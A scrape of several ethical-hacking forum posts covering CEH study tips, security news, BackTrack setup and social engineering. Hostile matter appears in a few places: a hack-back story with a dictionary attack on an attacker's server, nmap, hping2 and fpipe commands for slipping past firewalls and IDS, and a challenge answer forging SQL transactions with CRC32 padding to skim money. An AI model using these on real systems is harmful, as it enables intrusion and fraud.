1;Hacked server but logs show a traceable IP.i there im an it engineer in london. last thursday i was called out to a client who i had never been to before. they were having some major server problems. after poking around a bit it transpired that their server had been hacked. whoever had got in had created himself a user account with domain admin privileges and inserted a virus on the server which ran as "2footninja.exe" or something like that. i spent most of the day locking down the server so it couldnt be repeated. however, i then began checking the logs to see if i could find anything about who had hacked this server. i subsequently found that whoever had hacked this server did so from the ip address <removed as someone complained>. after doing a quick whois on the ptr record it seemed that this was a "one and one internet" customer (i assume this is a broadband provider in the us). more than that i cannot tell. i then did some portscans and found 3389 and ftp open. i also managed to login via anonymous ftp and located the virus he used to infect my server in a file " foot.zip" i then left and went home, that night i ran tsgrinder against his terminal server port but came up with nothing - no doubt my dictionary attack would have been ineffective against someone who knew what he was doing anyway. i was hoping if i could log into his server i might be able to find out his name or email address... other files i located on his server of interest was a directory "artexpo 2007" which seemed to have been files perhaps taken from another company. i tried contacting the person kim who was listed on the bottom of some of the documents via email but got no reply. my question is this: have i reached the end of my detective work? is there nothing more i can learn about this person? has he escaped forever without me being able to (at least) send him an angry email? any thoughts/coments would be interesting. pet

self-study approach as opposed to boot camps. first, because my current employer wont pay for it and i dont have the financial means for paying a full blown course. second, i learn and retain information better if i study on my own. so i went ahead and registered to this site. i began to read articles about the subject and also posted questions to the forum in which responses were immediately received. the following links will direct you to the ceh topic forums that helped me with my study: http://www.ethicalhacker.net/component/ ... 1/#msg2731 http://www.ethicalhacker.net/component/ ... 4/#msg3574 http://www.ethicalhacker.net/component/ ... pic,174.0/ http://www.ethicalhacker.net/component/ ... pic,665.0/ http://www.ethicalhacker.net/component/ ... een,1/#new i started to study last september by reading the first book (gray hat hacking : the ethical hackers handbook). this book is a little advance and it talks about vulnerability tools, advance port scanners, programming survival skills and buffer overflow. i began reading this book because i was fascinated with exploit coding, source code analysis and the like, and because i already had 2 years experience under my belt in the security field. if you lack the knowledge of hacking methodology, buffer overflows and pertinent tools then i suggest that you read this book last after reading the other books that i will now mention. my second book (counter hack reloaded by ed skoudis). awesome book on step-by-step hacking and countermeasure. ed illustrates and explains clearly on how to ethically hack systems and network in a methodical fashion. if you really want to learn on how to conduct a penetration test and how to defend your network, this is the book. it gives you a clear picture on the methodology that the hacker use to compromise your network. the other two books that i will now list is mainly focus on the cert itself. after reading ed skoudis book you should have a clear understanding of the hacking methodology, these books will focus the main objectives of the ceh to help you pass the exam. for a detail explaintions on ceh and its objectives, i recommend (certified ethical hacker exam prep (exam prep 2)). this is book is far way better compared to ec-council official courseware. the book help grasps knowledge of network penetration testing skills. please be advice though, theres lots of typo errors some misinformation. just read carefully and if you find something that you dont understand or confused about, research your question or post your inquiries to the forums. i did purchase ceh(v5) courseware but i only read half of it because there was to many information to read and for you to remember. it did not help me accept for the lab manual and tools that came with the cd. however, in my exam there were only few tools that i was asked about. the courseware in my oppnion is only good for reference. if you have the money and would like to add it to your library then go ahead and buy it but other than that you can definitely pass the exam without it. the second book focusing on ceh which i highly recommend is the (ceh: official certified ethical hacker review guide: exam 312-50). this book really narrows down what you need to know to pass the ceh exam. its concise, covering all exam objectives and its officially endorsed by ec-council. this is book is a must have. some of the practice questions that came with the review guide especially from the cd rom was ask in my exam. so basically these are the books that i read for the exam. as i was reading these books i created a virtual lab at home and practice the tools mentioned in those books. this will really help for the exam as you will definintly remember the commands and switches when ask in the test. now even though i created a virtual lab i was compel to enroll the offensive security 101 class because of the course price and earning an additional certification just by taking their hacking challenge exam and at the same time practice the tools and methodology for the ceh exam. man, this couldnt have come in a better time. the offensive course helped me apply my hacking skills that i learned from reading the aforemention books and from the course itself. i consider this to be the best hacking course out there for the money. for my complete offsec 101 review please refer to the following link: http://www.ethicalhacker.net/component/ ... ic,1152.0/ as for practice test is concern, i purchased testking ceh practice test since i heard good things about it. the product came with 458 312-50 downloadable exam engine and a downloadable, printable exams (in testking ipad format). this played a big part of me passing the exam as well as practicing the test questions that came with ceh focus exam prep books. the practice tests helped me evaluate my understanding of the material and enforce my preparation for the exam. check the following for more info: http://www.testking.com/312-50.htm to sum it up, it took me 8 months of preparation for the ceh(v5) exam via self-study and compared to a boot-camp sessions i know that the majority of the people will choose this route instead. but let me tell you that it is all worth it and i cant tell you how much i learned during the course of my studies. at the end, i earned two certification and only spent less than $800 not counting the official courseware from ec-council (which really did not help me in this case) and including offensive security 101 course. i think you cant go wrong with the strategy that i took. anyways, i hope this information that i hand before you will help you earn the certified ethical hacker certification and i would once again like to express my gratitute to eh-net site creator don and its wonderful members for an excellente site. thank you. additional info with regards to the ceh(v5) exam: in the exam i had a lot of questions on snort, nmap, honeypot, firewall and tcpdump logs. make sure you know how to interpret these. know how to read code, for instance, c, asp and bash scripts. there were multiple questions on buffer overflow, sql injection and such. as for the hacking tools, in my exam there only a few such as nmap, hping, snort command line and ettercap.â  just follow the (ceh: official certified ethical hacker review guide: exam 312-50) and read about the tools described in this book. as a matter of fact, this book really hit the spot and informs you what you should expect from the test. know your ports such as (21(ftp), 23(telnet), 389(ldap)). overall the test was diverse in its entirety in terms of the questions being ask. i considered the ceh(v5) to be a good test.  for all future candidates, good luck
2;Cyberwar: Is This The First Salvo?y john mccormick and deborah gage     estonia claims that russia launched a virtual attack this past month against government agencies, followed by cyberassaults on its newspapers and tv stations, schools and banks. if true, this would represent the first cyberattack by one nation on another. should americans and american business be concerned? two of the nations leading security experts, ira winkler and alan paller, spoke to baseline this week and gave their perspectives. -------------------------------------------------------------------------------- winkler: were too quick to react ira winkler, one of the nations leading computer security experts, is the author of zen and the art of information security. he is also president of internet security advisors group, a security consultancy that specializes in vulnerability assessments and penetration testing services. he sits on the board of advisers at securify, a computer monitoring and security company.   winkler is also a one-time intelligence and computer systems analyst at the national security agency, the former technology director at the international computer security association, and the former chief security strategist at hewlett-packard, a post from which he resigned in 2004. he and john mccormick, editor-in-chief of baseline and cio insight, exchanged e-mail about the news coming out of estonia. this is an edited version: what do you think about the events taking place in estonia? could this really be the first cyber battle between nations? no, it demonstrates the effects that imbeciles have when organizations do a poor job protecting themselves. the attacks are due to people with too much time on their hands and are not a government-sponsored thing. russia could have blown them off the internet if they wanted to. it amazes me how people want to quickly attribute attacks to nation states, when any imbecile with connectivity and basic knowledge can accomplish such attacks. is the u.s. vulnerable to this type of attack? could it happen here? these types of attacks occur all the time in the u.s.. we just have a more resilient infrastructure to deal with the problems. what things should we being doing as a country to protect ourselves? as a country, we have shown that we are not vulnerable to these types of attacks. while there might be small outages every so often, we are too resilient. i think we should continue to provide bandwidth, but pass laws that require companies to enact basic security countermeasures so that they dont enable such attacks against others and the country. what three things should cios/csos being doing to protect their companies? make sure that they have plans in place for ddos [distributed denial of service] attacks.  enforce basic computer security policies  ensure that they have a robust infrastructure in place to minimize the impact of ddos attacks.  -------------------------------------------------------------------------------- paller: there are attacks every day alan paller, director of research for the sans institute, is an original member of president bushs national infrastructure advisory council. he spoke with baseline senior writer deborah gage. how vulnerable are u.s. companies and government agencies to politically motivated cyberattacks like those that have been conducted against estonia? one of the lesser-known facts of the internet is there are thousands of denial of service attacks every day. it all began in 1998 and 1999 with gangs of hackers attacking and disabling other hackers chat rooms because the first group felt "disrespected." from there, it spread everywhere. there are ddos (distributed denial of service) attacks-so called because they are attacks launched from many distributed (zombie) computers. environmental groups attack companies they think are being careless with the environment; extortionists attack gambling sites (and many, many other types of sites) threatening to disable the site if its owners do not pay from $10,000 to $1,000,000. it has gotten so common that businessweek did a story about the online gambling sites paying extortion to these attackers. israelis and palestinians launch ddos, china and taiwan launch ddos. its huge. whats the best way to protect ourselves? every company is at risk. if you dont plan for a defense, it is really hard to institute one once an attack starts. and you cannot defend yourself on your own network. there is one general solution. contract with your isp [internet service provider] for a denial of service protection service. the isp sets up a monitoring system for spikes of traffic attacking the customer and, when they see it, they block it as it comes into the isps network so the target never actually gets disabled. not perfect because with enough zombies even an isp could be overwhelmed, but it works well enough. for original story: http://www.baselinemag.com/article2/0,1 ... 644,00.asp do
1;Using BackTrack4 as your Everyday O/Sknow this topic has been beaten to death all over, from the google searches i did, but here it is again 11/10/10 in eh-net... so, im really tired of wondering about what every connection is, doing netstat commands in win7, no matter what firewall or ports i have blocked, services down, pathches,  registry mods etc...  always something makes me wonder what is that and why.. then i waste too much darn time researching it to no end.  maybe my paranoia level has raised now that i post on ethical hacking message boards, lol i dunno… so, i know its purpose is as a pen-testing tool, but now that its run on ubuntu, it really is a solid o/s that detects all my hw with no problem.  it also has a lot of extra goodies already installed for us that are interested in the world of ethical hacking, pen-testing, security auditing, research etc.  so, if i just create a non root user(s) for everyday use and sudo the essentials, setup some iptables/chains, maybe a good dose of snort… would this help make a good every day o/s, tha’ts more ‘hacker-proof’? another option is to go with the latest unbuntu (or your fave flave) and secure it down as best possible and use the tools you most like (although the preconfigured array of bt4 is vast). so, essentially my question is, what is most secure for i, the end-user who just really browses sites to find information, uses word here and there, needs to have readily available pentesting tools for my education, research, work etc. “out of the box” is bt4 more secure than windows with it’s firewall or comodo etc..  ? does having all these tool on bt4 make it more of a risk because they are somehow more succeptible to other hackers trying to take over the system (even if i have a separate non-root logon)?   what about throwing ubuntu into this vs win7, given the fact that it doesn’t come with pentesting tools (other than linux cli tools).. i know there is no such thing as an remotely unhackable sytem other than just taking out the wireless nic and / or nic, but i’m just not getting piece of mind with windows 7 anymore and auditing its every log lately is taking its toll.. i don’t even download stuff anymore other than tools.. please advise… - hacker that doesnt want to get hacked or just mo
3;Mac Coming into Focus As Attack Targetheck out this eweek article: by lisa vaas  june 1, 2007  news analysis: there havent been mass mac exploits to date, but interest is growing, as evidenced by the quick turnout of exploit code for a recently disclosed vulnerability. compared with windows, the macintosh platform is still largely untouched by vulnerability exploits. but the prompt release of exploit code for a vulnerability detailed in a may 24 set of updates shows that its catching up fast when it comes to grabbing the attention of exploit writers.  "it is very microsoft. its something weve grown to expect in microsoft: the descriptions of patches lead people to write exploits for something thats been patched," said rob enderle, principal analyst for the enderle group. "it was only a matter of time before that kind of behavior hit [the mac] platform. people are going after consumers, and theyre going after consumers broadly."  security research company immunity released the exploit code—which leveraged a buffer overflow vulnerability in the upnp internet gateway device standardized device control code thats used to create port mappings on home nat (network address translation) gateways in the os x mdnsresponder implementation—less than 24 hours after apple had released a patch for it. apple implements the protocol in its bonjour technology to enable devices to automatically discover each other without users having to enter ip addresses or configure dns servers.  the release of the exploit code for this flaw shows that interest in mac vulnerabilities is high, analysts say. thats not surprising; even though macs arent used as broadly in businesses as windows machines, plenty of consumers use them, enderle said. another factor that may be causing attackers to focus more on macs is that windows operating systems are getting "much [harder] to penetrate," he said. and to top it all off, mac users constitute a "relatively lucrative demographic."  "these arent bottom-feeding notebook buyers," he said. "in overall terms, their number is small. but its always been an attractive target, increasingly so since [macs] lack secondary protections that windows [users] enjoy [such as a rich selection of third-party security software], though the primary platform itself [has been] in many cases and still is more secure."  at any rate, as pointed out by ray wagner, an analyst at gartner, nobody ever said os x was impregnable. "any large code base has vulnerabilities," he said.  so no, security analysts arent heading for the hills over the specter of attackers paying more attention to the mac platform. rich mogull, another gartner analyst, said that the buzz in the hacker underground is that "the bad guys are targeting macs a little more [but] not enough to be worried about yet."  besides, one has to question the motivations behind the release of mac exploit code, wagner said.  "often the motivation is some kind of publicity," he said. "recognizing vulnerabilities in os x does have some cachet these days."  still, many analysts would like apple to get more serious about security.  "apple is as much out of touch as microsoft was half a decade ago," enderle said, pointing to the fact that apple has no chief security officer. "everybody has to take security seriously. theres no switzerland when it comes to attacks. if you have something somebody wants theyre going to find a way to get it."  another thing that analysts fault is apples lack of a solid patch process—one thats regularly scheduled, such as microsofts patch tuesday or oracles tri-monthly patch releases. "to date [apple isnt] warning users much about problems and exposures," enderle said. "[its] kind of easing into this, not embracing a security ecosystem that lets people get ahead of the curve and take care of problems before they occur. … [it tackles] individual problems and [it thinks that] if it fixes a given problem it will go away."  mogull credits apple with being increasingly responsive with putting out patches, in spite of not having a process as formalized as microsofts.  still, he said, there are things apple should be doing to its operating system that would help to secure it. for full article: http://www.eweek.com/article2/0,1895,2140308,00.asp do
2;DHS Acknowledges Own Computer Break-Insy ted bridis, associated press writer  wed jun 20, 6:34 am et washington - the homeland security department, the lead u.s. agency for fighting cyber threats, suffered more than 800 hacker break-ins, virus outbreaks and other computer security problems over two years, senior officials acknowledged to congress.   in one instance, hacker tools for stealing passwords and other files were found on two internal homeland security computer systems. the agencys headquarters sought forensic help from the departments own security operations center and the u.s. computer emergency readiness team it operates with carnegie mellon university. in other cases, computer workstations in the coast guard and the transportation security administration were infected with malicious software detected trying to communicate with outsiders; laptops were discovered missing; and agency web sites suffered break-ins. the chairman of the house homeland security committee, rep. bennie thompson, d-miss., said such problems undermine the governments efforts to encourage companies and private organizations to improve cyber security. "what the department is doing on its own networks speaks so loudly that the message is not getting across," thompson said. congressional investigators, expected to testify wednesday during an oversight hearing about the departments security lapses, determined that persistent weaknesses "threaten the confidentiality, integrity and availability of key dhs information and information systems," according to a new report from the government accountability office being released later in june. the homeland security departments chief information officer, scott charbo, assured lawmakers his organization was working to prevent such problems. "we need to increase our vigilance to ensure that such incidents do not happen again," charbo wrote in testimony prepared for wednesdays hearing. "the department takes these incidents very seriously and will work diligently to ensure they do not recur." the computer problems disclosed to the house homeland security subcommittee occurred during fiscal 2005 and fiscal 2006, and occurred at dhs headquarters and many of the departments agencies, including tsa, the coast guard, federal emergency management agency, customs and border protection and others. the subcommittees chairman, rep. jim langevin, d-r.i., said break-ins to government computer networks and theft of information are "one of the most critical issues confronting our nation, and we must deal with this threat immediately." all the problems involved the departments unclassified computer networks, although dhs officials also have acknowledged to lawmakers dozens of incidents they described as "classified spillage," in which secret information was improperly transmitted or discussed over nonsecure e-mail systems. original story: http://news.yahoo.com/s/ap/20070620/ap_ ... r_security do

3;Bypassing Firewalls with simple scanshat is one of the first things to do in a ethical hack?  ec-council suggests information gathering. while that is very true, that is becoming less requested. usually you are given your target information from the get go. seems like more and more organizations want you to get right to it and dont want to spend money on what they perceive  as "extras".  a good place to start is to inspect the firewall rules of your target. there are some simple tests to do right at the start. these tests are old school and work mostly if its an improperly configured iptables firewall. depending on the test enviroment, we are not going to be too worried about being stealth, so we will begin with the traditional traceroute or tracert command to the target. simply "traceroute victims ip."  this in return should give you a return of astericks. this usually is a sign that the firewall is preventing packets from leaving the target. this is normal because most firewalls filter diagnostic icmp packets.  we attempt to "fool" the firewall by using tcp packets and hping2 is great for that. we enter "hping2 -t -t 1 -s -p 80 victims ip"  with a little luck we get a response.    the next scans we perform are with nmap.  for a fast scan we use nmap -ss -f -n -o victimsip. we might try just a simple test of the firewall rules with "nmap -v -sa -ff -r -n victimsip" if we have the time and this can sometimes take an hour or so but is very complete, we use nmap -v -g53 -ss -sr -p0 -o -p1-65000 -o nmap.out victimsip.  i like the -g switch, which lets you set the source port.  you can test for misconfigured rules that allow packets based on source ports, such as ftp data (port 20), dns lookups (port 53) or return http traffic (port 80). this is an important scan because one mistake many administrators make when creating rules for allowing traffic through their firewall is to trust traffic based simply on its source port number, such as dns replies from port 53 or ftp from port 20.   other switches i like are -sa and -po for firewall scanning. if you are trying to avoid ids logging, use the default -rh, which is a randomized port order. this, combined with slow timing options, will make network monitoring hard to detect the scan. as an example we might try, nmap -ss --scan-delay 500 -f -rh victimsip.  we might even be able to slip through if the organization  has devices connecting to the internet. this scan will test for devices like routers, printers,switches,etc.. map -vv -ss -o -n victimsip/24 -oa inventory. with a little luck you might get an inventory of devices. ok now that we have managed to discover active ports we might be able to breach the server with a simple tool like fpipe with fpipe -l 53 -s 53 -r 80 victimsip. its rare to work but when it does its sweet because it can be shocking to an organization when they have just implemented their new shiny firewall that was never configured to be breached by a couple of free tools.    the idea of these scans is to test for misconfigured firewalls. if the rules are in place correctly we wont get results. auditing the firewall is a very crucial and good first place to start your ethical hacking session
3;My Dream Machineam not sure how many reading the forums are interested in this, but i thought i would share my personal set up on my laptop.  i have done a lot of experimenting over a long period of time of what works best for me when conducting a pentest.  in reality, we are confined to using laptops for the most part. the laptop has been the hackers tool of choice since they first came on the scene. thank god they are finally making some laptops with some real power.   as far as hardware goes, right now i am really leaning towards intel. amd was traditionally the hacker’s choice, but now i have to say those energy efficient dual core cpus that intel makes for laptops are really awesome.  get the most powerful cpu you can afford and get at least 1 gig of ram if not more.  don’t waste money on a gaming laptop even if they do look powerful from their specs.  those are usually battery hogs and you really want one that has some ability to live off the battery.  there are times when you might not have access to a wall socket. i always have an extra battery in my case. whats really nice is that now linux has so much driver support, your on board wifi should work with little problem whereas just a few years ago it was a real challenge to find any distro that would work with a dell wireless mini wlan card.  on my laptop i triple boot.  on the first partition i use windows xp pro. the second partition i have backtrack 2 final and on the third i have installed ubuntu.  i actually use two laptops when i am performing a pentest and they both have the same set up. that is, they both have 3 partitions with the same 3 operating systems on board. this works well because i can now have whatever combination i like. i can have xp running on one laptop while i have backtrack running on another. or say ubuntu on one and backtrack on another, etc… now i could just use vmware to accomplish a similar set up, but i really don’t like to do that for what i call a “hardcore hack”.  i get faster results by not hogging the cpu and other resources on a single laptop by using this dual set up.  if you have not tried this, i recommend it highly and i am sure you will see the difference.  setting up your laptop this way is not difficult. first install windows. after that you can either make your other partitions with an app like partition magick or use qtparted on the backtrack live cd.  if you use qtparted, make sure you use the umount command to unmount the partition before attempting any changes. a simple thing , but people tend to forget that i have noticed.   after you have made your new partitions, install backtrack.  earlier i made a post concerning how to install backtrack 2: http://www.ethicalhacker.net/component/ ... ic,1433.0/    just remember to change any commands that involve the partition to specify the partition you want to target. for instance, if sda3 is your target for backtrack, then make sure you change sda or sda2 in your commands to sda3, including where to write the mbr.  simple enough.   finally install ubuntu to your final partition.  after that, attempt a boot up and you should see the grub boot loader. you should see all 3 choices available to boot. windows will boot fine and so will ubuntu, but not backtrack. you will need to boot to ubuntu and make some changes to the grub menu.  once there, change the script to  read : title backtrack rootnoverify (hd0,3) kernel /boot/vmlinuz vga=791 root=/dev/hda4 ro boot after that, just reboot and you should be fine. if anyone else here wants to share their idea of the perfect set up, please do so

3;Skillz April 07 Winning Entry - Technicalongratulations  balazs attila-mihaly  for winning the "best technical answer" category.  the guy sent source code... how cool is that? - -tl hello. 1)  aside from hating their jobs, what impending action might be another reason for the boys to try this plan? i dont know if this is a good reason to try their plan, but it is a good reason to do it fast if they decided that they go forward with the plan: the possibility that lumburgh moves their cubes such a way that they cant place the rogue wireless access point in a position where it delivers a signal strong enough to the machines in accounting to convince them to connect to it rather than the real access point. 2)  why was peter smiling?  what mistakes had initrode made in their accounting system design? their mistake was that (which is unfortunately not uncommon in the real world) to use a good technology for the wrong purpose. specifically, crc is an error correction mechanism which was designed to deal with the errors that can be generate by electro-magnetic interference with the transmission lines for example. it was not designed to be a cryptographic hash or to whitstand attacks from an intelligent third party. because of this the generation of arbitrary strings with a given crc value is rather simple and can be done in o(n) (linear) time with regards to the length of the string as described in the paper by martin stigge,  	henryk  	plötz, wolf müller and jens-peter redlich titled "reversing crc – theory and practice" which can be found at  http://sar.informatik.hu-berlin.de/rese ... /index.htm given this the fact that a crc value at one end and a query which has the same crc at the other end does not prove anything. (there are of course other errors and potential errors in the system - like the fact that transactions are not used, which could mean that an interrupted connexion can result in money disappearing without a trace or appearing from nowhere; the system relies on the client issuing updates rather than using stored procedures for example the access to which could be controlled more strictly; also the quality of the "update" logging is questionable, having seen the quality of the other parts and it probably can be bypassed for example by using a delete / insert pair rather than a direct update - but these are irrelevant from the point of view of this challenge) 3)  give a working example of a forged transaction using the values in peters second example. for the masking to work, the two updates must be sent as one, because otherwise we would have one extra statement logged at the server, compared to the number of crcs recorder at the client which would make the existence of an anomaly pretty obvious. so during the attack we must substitute the query update account set balance = 164145.162110 where acctno = 141143153; with update account set balance = 164145.16 where acctno = 141143153; update account set balance = 135.535532 where acctno = 31337; -- <some data to make crc match the crc of the original query> (in sql everything after -- is comment until the end of the line, so we can insert almost any data there) this is usually no problem, because most database drivers allow the execution of multiple statements from a single string, however there are some vendors (most notably newer versions of mysql) who disallow this to counter sql injections. mssql does not disallow this as far as i know, so everything is ok. below are two queries the crc of which matches the original (for representing the padding the c-style notation was used to encode unprintable characters) update account set balance = 164145.16 where acctno = 141143153;

- --\x6d\x2c\x3e\x62\x22 the difference between the two is that the first can be generated almost instantly (technically speaking the complexity of the generation algorithm is o(n), but practically both n - the length of the string - and the multiplication factor is so small that the algorithm terminates in no time) and always contains exactly 4 bytes, but those bytes may be unprintable ones (over 0x7f). the second query contains only 7-bit clean printable characters, but it was generated with brute force and it took several minutes to generate (meaning that it can not be used in a real-time spoofing system, unless such a big delay is acceptable. usually there is no problem with dumping arbitrary bit data query - since its in the comment section anyway - but there might be some need to have 7-bit clean padding material. however the bruteforce approach creates new problems because lag they introduce (like someone in accounting performing the update and checking the results after several minutes and wondering why the update didnt occure yet). 4)  how should the transaction system be fixed to avoid this kind of problem in the future? as a quick (and probably easy to implement) first step the length of the queries should also be stored together with the crc value and verified on comparison. this makes the spoofing almost impossible since there is no space to add the additional query to. when a complete redesign becomes possible, the following things should be implemented to avoid further security problems of this kind: - -an encrypted tunnel between the database server and the machines in accounting. options would be ssh port forwarding, ipsec and probably mssql has native support for ssl sockets. - -creating stored procedures for the operations and give access from the outside world (ie. accounting) only to the stored procedures, not to any tables - -if mssql has an option to disallow multiple statements in the same query, it should be set. - -stronger - an possibly multiple- hash functions should be used (and by hash functions i mean "real" hash functions like md5 or sha) and the length of the original query should also be stored. below you can find the source code for the program written to generate to padding at the end of the queries so that they have a particular crc value. it takes two parameters: the original string (so that it can compute the target crc value) and the string which should be completed so that it has that particular crc value. it outputs two things: the first are the four bytes / characters generated by the algorithm described in the reversing crc paper and the second ones are generated by brute-force and are guaranteed to be 7-bit clean. for example if the command line is: "update account set balance = 164145.162110 where acctno = 141143153;" "update account set balance = 164145.16 where acctno = 141143153;

"it is running windows...it cant be a really nice phone!" screams michael. "just because you dont understand windows, doesnt mean that it isnt nice." says samir and pushes his chair back from the table, as if he is going to jump up. "shut up, both of you." barks peter, "joanna and little petey are out tonight and i want to discuss this in a more discrete place.  come by the house after work and ill tell you what we are going to do." samir and michael look at each other, then at peter.  "you call your son little petey..??.." they asked in unison. glaring back at them, peter says "just meet me at the house."  they get up and head back to the office not speaking a word during the long, somber walk back. later that evening, peter answers a knock on his door.  "whats up g?" says michael as he flails his arms around in some sort of spastic gangsta move.  samir just pushes by him and gives peter a nod. as peter leads them through his living room, he turns off the channel 39 kung-fu movie that was blasting through the television and takes them to a back room. "now just like at initech, before we go any further, we have to swear to god, uh...allah, that nobody knows about this but us, all right? no family members, no girlfriends, nobody." said peter. samir and michael nod in agreement as they hear a voice through the back wall. "dont worry, man.  i wont tell anyone either." shouts lawrence. "wtf!!" exclaims michael. "uh, dont worry, its just lawrence. hes cool." says peter. "lawrence is living in your walls?" asks samir. "of course not, he has been renting our attic since he lost his apartment. it gives us some extra money and lawrence a place to live." explains peter, "now, we dont have much time before joanna and little petey get home." samir and michael glance at each other but decide not to make any comments.  they can feel peters glare as if he is daring them to say something about his sons nickname. peter continues, "so like we were talking about at lunch, my plan will still work.  see, crc32 is not a cryptographically secure hash.  it was developed to detect errors in transmission." "yeah, polynomial division." pipes in samir flaunting his phone in michaels face. "shut up!" shouts michael.  "i know what he is talking about.  i did some system analyst work for the district in la awhile back. while chloe and i were stopping a worm caused by nina, she was telling me about a paper that came out of humboldt-university in berlin.  it was called reversing crc - theory and practice.  a very good read." "nina developed a worm?" asks peter, confused. "yes." confirms michael. "nina... the receptionist? corporate-accounts-payable-nina-speaking-just-a-moment nina? the nina who is now working in initrodes hr department and sleeping with brian?" asks peter, now even more confused. samir interrupts "nina is sleeping with brian?" frustrated michael blurts out "no! nina myers, the double-agent. anyways, it doesnt matter and im not supposed to talk about it." "using a tool like crc32 hacker developed by andrew koupparis, we can duplicate a crc32 hash with an additional 4 bytes or less.  i like the command line version." says michael as he throws a glance at samir. "it is still windows." smirks samir. ignoring him, michael continued to describe his idea.  "if we take an original transaction like this:" select balance from account where acctno = 141143153; select balance from account where acctno = 57165156; update account set balance = 1021651.711031 where acctno = 57165156; update account set balance = 164145.162110 where acctno = 141143153; "it has a crc32 value of b69162cf." injects samir again flaunting his phone. still ignoring him, michael says, "we can change the transaction to this:" select balance from account where acctno = 141143153; select balance from account where acctno = 57165156; update account set balance = 1021651.711031 where acctno = 57165156; update account set balance = 164145.16 where acctno = 141143153; update account set balance = .002110 where acctno = 31337; -- "then a little command line kung-fu and we can add hex bytes 0x6e 0xa4 0x42 0x59 to the end of the transaction and poof - duplicate crc32 value.  the new transaction looks like this in hex:" 53 45 4c 45 43 54 20 62 61 6c 61 6e 63 65 20 46 52 4f 4d 20 61 63 63 6f 75 6e 74 20 57 48 45 52 45 20 61 63 63 74 6e 6f 20 3d 20 31 34 31 31 34 33 31 35 33 3b 0d 0a 53 45 4c 45 43 54 20 62 61 6c 61 6e 63 65 20 46 52 4f 4d 20 61 63 63 6f 75 6e 74 20 57 48 45 52 45 20 61 63 63 74 6e 6f 20 3d 20 35 37 31 36 35 31 35 36 3b 0d 0a 55 50 44 41 54 45 20 61 63 63 6f 75 6e 74 20 53 45 54 20 62 61 6c 61 6e 63 65 20 3d 20 31 30 32 31 36 35 31 2e 37 31 31 30 33 31 20 57 48 45 52 45 20 61 63 63 74 6e 6f 20 3d 20 35 37 31 36 35 31 35 36 3b 0d 0a 55 50 44 41 54 45 20 61 63 63 6f 75 6e 74 20 53 45 54 20 62 61 6c 61 6e 63 65 20 3d 20 31 36 34 31 34 35 2e 31 36 20 57 48 45 52 45 20 61 63 63 74 6e 6f 20 3d 20 31 34 31 31 34 33 31 35 33 3b 0d 0a 55 50 44 41 54 45 20 61 63 63 6f 75 6e 74 20 53 45 54 20 62 61 6c 61 6e 63 65 20 3d 20 2e 30 30 32 31 31 30 20 57 48 45 52 45 20 61 63 63 74 6e 6f 20 3d 20 33 31 33 33 37 3b 20 2d 2d 6e a4 42 59 "that worked!" exclaims samir staring at the duplicated crc32 number on his phone."but wont the accounting people notice the comment statements at the end of the transactions?" "who cares?!" says peter.  "if they are dumb enough to use crc32 for transaction security, they will probably just think it is garbage from the transmission because the crc32 values will still match." "we probably could arrange the bits in such away that the skimmed balance or fake account number would include the four additional bytes and then we could remove the trailing comment statement." offers michael. "but that would take to long to develop and compute each week.  we also have the time-stamp issue to worry about.  this way seems fast enough and they will never notice. lets script this up and we can get it ready for fridays transactions." says peter. "no way!" says samir shaking his head. "im not going to spend my life in a pmita federal prison.  we have good jobs and no reason to do this." "of course we have a reason to do this.  didnt you see the tps memo that lumburgh sent out?" asks peter. "yes, but what does that have to do with anything?" ask simar. "everything."  exclaims peter.  "that dumb ass lumburgh reused a memo that he sent to the mr. roop as a template for the memo that he sent to us.  i noticed the deleted text in the document when i was watching the wireless traffic.  this is what he put in the memo to mr. roop:" mr. roop, it has been six months since i was brought on board here at initrode and, i might add, im happy as a clam being on your team.  per your sage advice, ive waited several months before initiating any type of downsizing activity within my team, because, as you so wisely point out, coming on board and immediately cleaning house could appear badly to the employees.  so, now that it is my six month anniversary, i want to get the go-ahead from you to remove some troublemakers and dead wood that simmons stuck me with before his retirement. i would recommend discharging the following employees: peter gibbons – peter is habitually late, lacks focus, has a bad attitude (as demonstrated by his failure to participate in hawaiian shirt friday) and has repeatedly failed to put cover sheets on his tps reports. samir nagheenanajar – i dont trust this one.  he appears to be from some sort of middle-eastern country and i believe he may be plotting against initrode.  also, he constantly undermining my authority by correcting my pronunciation of his last name. michael bolton – when i worked at initech, we had an employee who snapped and was responsible for starting the fire that destroyed the company.  bolton reminds me of that employee.  hes always getting upset with the office equipment and muttering under his breath at it—a sure sign of a psychotic personality i am currently planning to discharge these employees when their current project is complete. how is your lovely wife and how are the kids?  hope to see you at the country club this weekend. regards, "mr. roop, as in vp of software development, mr. roop?" michael asks rhetorically. "yes." says peter.  "which is why we need to get this implemented. lumburgh is such a suck-up!" "oh, we are going to be in so much trouble." groans samir. "and it is not my fault if no one in this country can ever pronounce my name right. its not that hard: samir na-gheen-an-a-jar. nagheenanajar." "yeah, well at least your name isnt michael bolton." says michael. "now come here and help me, weve got to get this working.  you know peter, if they would have just used a cryptographically secure algorithm like md5, we would not be here working on this." "you are such an idiot." samir says to michael.  "didnt you see charlottes web 1.1, the directors cut?  charlotte had faked her death.  she and geography ants used a multi-collision flaw in the md5 algorithm to save wilbur and expand her consulting business." but peter is no longer paying attention.  he is steadily working on his scripts thinking about all the money they are going to make..
2;A security flaw every network hasne of the fun things about protecting a network is that we’re fighting a never ending battle against attackers, with unlimited time, resources from almost every corner of the world on their side. we have to sit there and attempt to deal with whatever is thrown at us.  theres one weapon that’s more devastating that any zero day attack that attackers use to bypass all our fancy high tech defences, are the one constant in any network, anywhere and one that constantly surprises us - users! yup, the very people that pay us to make sure that they can come on to the network, read their email, check the sports pages and occasionally do some profit generating work, are the biggest attack vector.  have you ever got a call for one of them wanting to open at a file or web site with the latest celebrity scandal or forward on a chain mail to the entire company to avoid bad luck? how about add a gadget which will enhance their effectiveness performance? with every new gadget designed to make their lives easier ours becomes harder, introducing new attack vectors and headaches to get them to work with the existing systems. oh, by gadgets i mean everything from simple home internet access to office system, blackberries, and mobile phones, to the business critical “need” to have ipod’s and itunes on corporate machines. the gleeful looks i’ve got from security researchers or penetration testers that are allow to launch social engineering attacking on the users can put you off lunch for a week.  there are dozens of stories about people swapping password for chocolate bars or even worse, usb drives.  http://www.darkreading.com/document.asp ... =column1_1 but the good ol’ “hi, i’m from your helpdesk, we’re having a problem with your account. can you confirm your username and password?” works more times than not and doesn’t cost anything.  if your still not convinced about the powers of social engineering on your users, read the about kevin minick  http://en.wikipedia.org/wiki/kevin_mitnick  or listen to  http://www.phonelosers.org/   be warned, phonelosers is 